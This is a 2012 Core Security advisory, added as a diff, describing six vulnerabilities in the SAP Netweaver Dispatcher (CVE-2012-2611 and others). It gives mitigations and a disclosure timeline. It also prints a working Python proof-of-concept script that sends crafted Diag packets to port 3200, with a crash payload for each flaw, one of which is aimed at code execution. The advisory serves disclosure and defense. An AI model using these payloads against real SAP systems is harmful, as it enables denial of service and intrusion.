@@ -1,0 +1,199 @@
+1. Advisory Information
+Title: SAP Netweaver Dispatcher Multiple Vulnerabilities
+Advisory ID: CORE-2012-0123
+Advisory URL: http://www.coresecurity.com/content/sap-netweaver-dispatcher-multiple-vulnerabilities
+Date published: 2012-05-08
+Date of last update: 2012-05-10
+Vendors contacted: SAP
+Release mode: Coordinated release
+
+2. Vulnerability Information
+Class: Buffer overflow [CWE-119]
+Impact: Code execution, Denial of service
+Remotely Exploitable: Yes
+Locally Exploitable: No
+CVE Name: CVE-2012-2611, CVE-2012-2612, CVE-2012-2511, CVE-2012-2512, CVE-2012-2513, CVE-2012-2514
+
+3. Vulnerability Description
+SAP Netweaver [1] is a technology platform for building and integrating SAP business applications. Multiple vulnerabilities have been found in SAP Netweaver that could allow an unauthenticated, remote attacker to execute arbitrary code and lead to denial of service conditions. The vulnerabilities are triggered sending specially crafted SAP Diag packets to remote TCP port 32NN (being NN the SAP system number) of a host running the "Dispatcher" service, part of SAP Netweaver Application Server ABAP. By sending different messages, the different vulnerabilities can be triggered.
+
+4. Vulnerable packages
+SAP Netweaver 7.0 EHP1 (disp+work.exe version v7010.29.15.58313).
+SAP Netweaver 7.0 EHP2 (disp+work.exe version v7200.70.18.23869).
+Older versions are probably affected too, but they were not checked.
+5. Non-vulnerable packages
+Vendor did not provide this information.
+6. Vendor Information, Solutions and Workarounds
+SAP released the security note 1687910 regarding these issues. Contact SAP for further information.
+
+Martin Gallo proposed the following actions to mitigate the impact of the vulnerabilities:
+
+Disable work processes' Developer Traces for the 'Dialog Processing' component (for the vulnerabilities [CVE-2012-2611], [CVE-2012-2612], [CVE-2012-2511] and [CVE-2012-2512]).
+Restrict access to the Dispatcher service's TCP ports (3200/3299) (for all vulnerabilities).
+Restrict access to the work process management transactions SM04/SM50/SM66 and profile maintenance RZ10/RZ20 (for the vulnerabilities [CVE-2012-2611], [CVE-2012-2612], [CVE-2012-2511] and [CVE-2012-2512]).
+7. Credits
+These vulnerabilities were discovered and researched by Martin Gallo from Core Security Consulting Services. The publication of this advisory was coordinated by Fernando Miranda from Core Security Advisories Team .
+
+8. Technical Description / Proof of Concept Code
+NOTE: (The tracing of 'Dialog processing' has to be in level 2 or 3 in order to exploit flaws [CVE-2012-2611], [CVE-2012-2612], [CVE-2012-2511] and [CVE-2012-2512]).
+
+The following python script can be used to reproduce the vulnerabilities described below:
+
+import socket, struct
+from optparse import OptionParser
+
+# Parse the target options
+parser = OptionParser()
+parser.add_option("-l", "--hostname", dest="hostname", help="Hostname", default="localhost")
+parser.add_option("-p", "--port", dest="port", type="int", help="Port number", default=3200)
+(options, args) = parser.parse_args()
+
+def send_packet(sock, packet):
+	packet = struct.pack("!I", len(packet)) + packet
+	sock.send(packet)
+
+def receive(sock):
+	length = sock.recv(4)
+	(length, ) = struct.unpack("!I", length)
+	data = ""
+	while len(data)<length:
+		data+= sock.recv(length)
+	return (length, data)
+
+def initialize(sock):
+	diagheader = "\x00\x10\x00\x00\x00\x00\x00\x00"
+	user_connect = "\x10\x04\x02\x00\x0c\x00\x00\x00\xc8\x00\x00\x04\x4c\x00\x00\x0b\xb8"
+	support_data = "\x10\x04\x0b\x00\x20"
+	support_data+= "\xff\x7f\xfa\x0d\x78\xb7\x37\xde\xf6\x19\x6e\x93\x25\xbf\x15\x93"
+	support_data+= "\xef\x73\xfe\xeb\xdb\x51\xed\x01\x00\x00\x00\x00\x00\x00\x00\x00"
+	dpheader = "\xff\xff\xff\xff\x0a\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
+	dpheader+= struct.pack("I", len(diagheader + user_connect + support_data))
+	dpheader+= "\x00\xff\xff\xff\xff\xff\xff"
+	dpheader+= "terminalXXXXXXX"
+	dpheader+= "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+	send_packet(sock, dpheader + diagheader + user_connect + support_data)
+
+def send_message(sock, message):
+	diagheader = "\x00\x00\x00\x00\x00\x00\x00\x00"
+	step = "\x10\x04\x26\x00\x04\x00\x00\x00\x01"
+	eom = "\x0c"
+	send_packet(sock, diagheader + step + message + eom)
+
+# Connect and send initialization packet
+connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connection.connect((options.hostname, options.port))
+initialize(connection)
+receive(connection)
+
+# Choose one of the following and comment the others
+
+#[CVE-2012-2611] 
+crash = "X"*114 + "\xff\xff" # --> Unicode Address to call !
+crash+= "Y"*32
+crash = "\x10\x06\x20" + struct.pack("!H", len(crash)) + crash
+send_message(connection, crash)
+
+#[CVE-2012-2612] 
+crash = "\x12\x04\x18\xff\xff\xff\xffCrash!"
+send_message(connection, crash)
+
+#[CVE-2012-2511]
+crash = "\x12\x09\x02\x00\x00\x00\x08" + "\x80"*8
+send_message(connection, crash)
+
+#[CVE-2012-2512] 
+crash = "\x10\x13\x09\x00\xFF\x12\x1A\x59\x51"
+send_message(connection, crash)
+
+#[CVE-2012-2513]
+crash = "\x10\x0c\x0e\x00\0a" + "A"*10
+send_message(connection, crash)
+
+#[CVE-2012-2514]
+crash = "\x10\x0f\x01\x00\x11" + "A"*17
+send_message(connection, crash)
+
+In the following subsections, we give the python code that can be added after the script above in order to reproduce all vulnerabilities.
+
+8.1. SAP Netweaver DiagTraceR3Info Vulnerability
+[CVE-2012-2611] The vulnerability can be triggered when SAP Netweaver disp+work.exe module process a specially crafted network packet. Malicious packets are processed by the vulnerable function DiagTraceR3Info in the disp+work.exe module when the Developer Trace is configured at levels 2 or 3 for the "Dialog processor" component of the "Dialog" work process handling the packet [2]. This vulnerability could allow a remote unauthenticated attacker to execute arbitrary code with the privileges of the user running the "Dispatcher" service. The following python code can be used to trigger the vulnerability:
+
+
+crash = "X"*114 + "\xff\xff" # --> Unicode Address to call !
+crash+= "Y"*32
+crash = "\x10\x06\x20" + struct.pack("!H", len(crash)) + crash
+send_message(connection, crash)
+
+8.2. SAP Netweaver DiagTraceHex Denial Of Service Vulnerability
+[CVE-2012-2612] The vulnerability can be triggered by sending a specially crafted network packet to the vulnerable function DiagTraceHex in the disp+work.exe. This vulnerability could allow a remote unauthenticated attacker to conduct a denial of service attack against the vulnerable systems. The following python code can be used to trigger the vulnerability:
+
+
+crash = "\x12\x04\x18\xff\xff\xff\xffCrash!"
+send_message(connection, crash)
+
+8.3. SAP Netweaver DiagTraceAtoms Denial Of Service Vulnerability
+[CVE-2012-2511] The vulnerability can be triggered by sending a specially crafted network packet to the vulnerable function DiagTraceAtoms. This vulnerability could allow a remote unauthenticated attacker to conduct a denial of service attack. The following python code can be used to trigger the vulnerability:
+
+
+crash = "\x12\x09\x02\x00\x00\x00\x08" + "\x80"*8
+send_message(connection, crash)
+
+8.4. SAP Netweaver DiagTraceStreamI Denial Of Service Vulnerability
+[CVE-2012-2512] The vulnerability can be triggered by sending a specially crafted network packet to the vulnerable function DiagTraceStreamI and could allow a remote unauthenticated attacker to conduct a denial of service attack.
+
+
+crash = "\x10\x13\x09\x00\xFF\x12\x1A\x59\x51"
+send_message(connection, crash)
+
+8.5. SAP Netweaver Diaginput Denial Of Service Vulnerability
+[CVE-2012-2513] The vulnerability can be triggered by the vulnerable function Diaginput, allowing a denial of service attack against the vulnerable systems.
+
+
+crash = "\x10\x0c\x0e\x00\0a" + "A"*10
+send_message(connection, crash)
+
+8.6. SAP Netweaver DiagiEventSource Denial Of Service Vulnerability
+[CVE-2012-2514] The vulnerability can be triggered by the vulnerable function DiagiEventSource in the disp+work.exe module. This vulnerability could allow a remote unauthenticated attacker to conduct a denial of service attack.
+
+
+crash = "\x10\x0f\x01\x00\x11" + "A"*17
+send_message(connection, crash)
+
+9. Report Timeline
+2012-01-24: Core Security Technologies notifies the SAP team of the vulnerability, setting the estimated publication date of the advisory for February 21st, 2012.
+2012-01-24: Core sends an advisory draft with technical details.
+2012-01-24: The SAP team confirms the reception of the issue and asks to use the security ID 582820-2012 for further communication. SAP also notifies its terms and conditions [3], and asks for Core to commit to that guideline.
+2012-02-01: The Core Advisories Team communicates that it has its own guidelines for the advisories publication process, which may conflict with SAP's guidelines. In particular, Core does not guarantee that the publication of the advisory will be postponed until a fix or patch is made available by SAP. If information about this vulnerability is partially or completely leaked by a third party, the advisory would be released immediately as forced release. Despite this, the Core team commits to comply with SAP's guidelines as much as possible.
+2012-02-21: First release date missed.
+2012-02-22: Core asks for the status of the fix and notifies that the release date was missed.
+2012-02-23: SAP notifies that, because the development team has to downport the solutions for a huge bunch of software releases, the earliest release date for the patches would be May 8th 2012.
+2012-02-23: Core re-schedules the advisory publication to May 8th.
+2012-04-16: Core asks if the patching process is still on track to release patches on May 8th and requests a status of the fix.
+2012-04-16: Vendor notifies that the release date is still planned for May 8th, but due to quality control processes this date cannot be guaranteed.
+2012-05-04: Core notifies that everything is ready for publication and requests the vendor to confirm the release date and the list of affected platforms (no reply received).
+2012-05-07: Core asks again for the status of the fix.
+2012-05-08: SAP notifies that they have released the security note 1687910 [4] on May Patch Day 2012 and asks to include that information in [Sec. 6]. SAP also requests Core to remove all the technical information researched by Martin Gallo in [Sec. 8].
+2012-05-08: Core replies that the reporting of vulnerabilities is aimed at helping vulnerable users to understand and address the issues; the advisory will thus be released with the technical information.
+2012-05-08: Advisory CORE-2012-0123 published.
+2012-05-10: ERRATA: CVE-2011-1516 changed to CVE-2012-2611. CVE-2011-1517 changed to CVE-2012-2612.
+10. References
+[1] http://www.sap.com/platform/netweaver/index.epx
+[2] http://help.sap.com/saphelp_nw70ehp2/helpdata/en/47/cc212b3fa5296fe10000000a42189b/frameset.htm
+[3] SAP's legal information, terms and conditions 
+http://www.sdn.sap.com/irj/sdn/security?rid=/webcontent/uuid/c05604f6-4eb3-2d10-eea7-ceb666083a6a#section46. 
+[4] SAP security note 1687910 
+https://service.sap.com/sap/support/notes/1687910. 
+
+11. About CoreLabs
+CoreLabs, the research center of Core Security Technologies, is charged with anticipating the future needs and requirements for information security technologies. We conduct our research in several important areas of computer security including system vulnerabilities, cyber attack planning and simulation, source code auditing, and cryptography. Our results include problem formalization, identification of vulnerabilities, novel solutions and prototypes for new technologies. CoreLabs regularly publishes security advisories, technical papers, project information and shared software tools for public use at: http://corelabs.coresecurity.com.
+
+12. About Core Security Technologies
+Core Security Technologies enables organizations to get ahead of threats with security test and measurement solutions that continuously identify and demonstrate real-world exposures to their most critical assets. Our customers can gain real visibility into their security standing, real validation of their security controls, and real metrics to more effectively secure their organizations.
+
+Core Security's software solutions build on over a decade of trusted research and leading-edge threat expertise from the company's Security Consulting Services, CoreLabs and Engineering groups. Core Security Technologies can be reached at +1 (617) 399-6980 or on the Web at: http://www.coresecurity.com.
+
+13. Disclaimer
+The contents of this advisory are copyright (c) 2012 Core Security Technologies and (c) 2012 CoreLabs, and are licensed under a Creative Commons Attribution Non-Commercial Share-Alike 3.0 (United States) License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
+
+14. PGP/GPG Keys
+This advisory has been signed with the GPG key of Core Security Technologies advisories team, which is available for download at http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
